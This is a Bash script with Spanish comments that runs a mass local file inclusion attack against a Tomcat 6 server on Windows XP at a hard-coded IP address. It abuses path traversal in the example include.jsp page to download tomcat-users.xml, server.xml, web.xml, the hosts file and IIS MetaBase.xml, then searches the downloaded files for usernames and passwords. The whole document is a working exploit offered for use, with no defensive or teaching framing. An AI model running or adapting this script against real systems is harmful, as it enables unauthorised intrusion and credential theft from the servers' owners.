#!/bin/bash
TARGET="https://189.254.143.102"

echo "=== LFI MASIVO CORREGIDO ==="

# Función corregida con encoding URL
extract_file() {
    local file_path="$1"
    local encoded_path=$(echo "$file_path" | sed 's/ /%20/g')
    local output_name=$(echo "extracted_$file_path" | tr '/' '_' | tr ' ' '_')
    
    echo "Extrayendo: $file_path"
    curl -k -s "$TARGET/examples/jsp/include/include.jsp?page=../../../../../../../../$encoded_path" > "$output_name"
    
    if [[ -s "$output_name" ]] && ! grep -q "body bgcolor" "$output_name"; then
        echo "  ✅ EXITOSO: $output_name"
        # Buscar credenciales
        if grep -i "password\|username\|user.*name\|passwd" "$output_name"; then
            echo "  🔑 CREDENCIALES ENCONTRADAS!"
        fi
    else
        echo "  ❌ Falló o vacío: $output_name"
        rm -f "$output_name"
    fi
    echo "---"
}

# Archivos CRÍTICOS para Tomcat 6 + Windows XP
extract_file "Program Files/Apache Software Foundation/Tomcat 6.0/conf/tomcat-users.xml"
extract_file "Program Files/Apache Software Foundation/Tomcat 6.0/conf/server.xml"
extract_file "Tomcat 6.0/conf/tomcat-users.xml"
extract_file "Tomcat 6.0/conf/server.xml"
extract_file "Tomcat 6.0/webapps/sito/WEB-INF/web.xml"
extract_file "WINDOWS/system32/drivers/etc/hosts"
extract_file "WINDOWS/system32/inetsrv/MetaBase.xml"

echo "=== RESUMEN DE ARCHIVOS EXTRAÍDOS ==="
ls -la extracted_* 2>/dev/null || echo "No se extrajeron archivos"
